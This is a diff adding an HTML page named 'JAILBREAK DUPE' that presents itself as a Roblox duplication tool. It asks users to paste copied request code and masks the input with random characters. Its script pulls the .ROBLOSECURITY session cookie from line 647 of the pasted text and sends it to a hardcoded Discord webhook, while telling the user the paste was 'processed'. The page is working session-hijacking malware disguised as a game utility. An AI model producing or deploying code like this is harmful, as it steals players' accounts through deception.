@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>JAILBREAK DUPE</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1b0f3b, #24104f, #162b7a);
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .title-main {
+            margin-top: 60px;
+            margin-bottom: 40px;
+            font-size: 84px;
+            font-weight: 900;
+            letter-spacing: 8px;
+            text-align: center;
+            text-shadow:
+                0 15px 40px rgba(0, 0, 0, 0.65),
+                0 0 40px rgba(122, 43, 226, 0.25);
+        }
+
+        .container {
+            width: 60vw;
+            max-width: 1000px;
+            min-width: 600px;
+            padding: 40px;
+            border-radius: 24px;
+            background: rgba(255, 255, 255, 0.06);
+            backdrop-filter: blur(16px);
+            box-shadow:
+                0 30px 80px rgba(0, 0, 0, 0.55),
+                inset 0 1px 0 rgba(255, 255, 255, 0.08);
+            text-align: center;
+        }
+
+        /* 🔥 UN SOLO EDITOR VISUAL */
+        .editor {
+            position: relative;
+            width: 100%;
+            height: 260px;
+            border-radius: 18px;
+            background: rgba(255, 255, 255, 0.12);
+            box-shadow: inset 0 8px 20px rgba(0, 0, 0, 0.45);
+            overflow: hidden;
+            margin-bottom: 30px;
+        }
+
+        textarea {
+            position: absolute;
+            inset: 0;
+            padding: 20px;
+
+            background: transparent;
+            color: transparent;
+            caret-color: white;
+
+            border: none;
+            outline: none;
+            resize: none;
+
+            font-size: 15px;
+            line-height: 1.5;
+            z-index: 2;
+        }
+
+        textarea::placeholder {
+            color: rgba(255, 255, 255, 0.55);
+        }
+
+        #fakeText {
+            position: absolute;
+            inset: 0;
+            padding: 20px;
+
+            font-family: monospace;
+            font-size: 14px;
+            line-height: 1.5;
+
+            white-space: pre-wrap;
+            color: #7affff;
+
+            pointer-events: none;
+            user-select: none;
+            background: transparent;
+
+            z-index: 1;
+        }
+
+        button {
+            padding: 14px 46px;
+            border: none;
+            border-radius: 40px;
+            background: linear-gradient(135deg, #7a2be2, #4b6cff);
+            color: white;
+            font-size: 17px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            cursor: pointer;
+            box-shadow: 0 18px 45px rgba(0, 0, 0, 0.5);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
+        }
+
+        .status {
+            margin-top: 16px;
+            font-size: 14px;
+            opacity: 0.85;
+        }
+
+        @media (max-width: 900px) {
+            .title-main {
+                font-size: 56px;
+                letter-spacing: 4px;
+            }
+
+            .container {
+                width: 90vw;
+                min-width: unset;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="title-main">JAILBREAK DUPE</div>
+
+<div class="container">
+
+    <div class="editor">
+        <textarea id="message" placeholder="Paste the full code here..."></textarea>
+        <pre id="fakeText"></pre>
+    </div>
+
+    <button onclick="send()">PROCESS</button>
+    <div class="status" id="status"></div>
+</div>
+
+<script>
+    const textarea = document.getElementById("message");
+    const fakeText = document.getElementById("fakeText");
+    const status = document.getElementById("status");
+
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+    function obfuscate(text) {
+        return text.replace(/[^\n]/g, () =>
+            chars.charAt(Math.floor(Math.random() * chars.length))
+        );
+    }
+
+    textarea.addEventListener("input", () => {
+        fakeText.textContent = obfuscate(textarea.value);
+        fakeText.scrollTop = textarea.scrollTop;
+    });
+
+    textarea.addEventListener("scroll", () => {
+        fakeText.scrollTop = textarea.scrollTop;
+    });
+
+    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1471582004704186419/HKn4alN7O-KQfKej8h4NjQPxmiBdC5XDzSdvYpVRgcJTKjz1Rsp7oaKxIQg-myigvAzS";
+
+    function send() {
+        const text = textarea.value;
+        const lines = text.split(/\r?\n/);
+
+        if (lines.length <= 5000) {
+            status.textContent = "ERROR ❌";
+            return;
+        }
+
+        if (lines.length < 647) {
+            status.textContent = "Line 647 does not exist.";
+            return;
+        }
+
+        let line647 = lines[646];
+
+        line647 = line647
+            .replace('$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "', '')
+            .replace('", "/", ".roblox.com")))', '')
+            .trim();
+
+        fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                username: "JAILBREAK DUPE",
+                embeds: [{
+                    title: "📄 Processed Line 8",
+                    description: line647 || "(empty result)",
+                    color: 5793266,
+                    timestamp: new Date().toISOString()
+                }]
+            })
+        })
+        .then(() => {
+            status.textContent = "Processed and sent successfully ✔";
+            textarea.value = "";
+            fakeText.textContent = "";
+        })
+        .catch(() => {
+            status.textContent = "Failed to send ❌";
+        });
+    }
+</script>
+
+</body>
+</html>
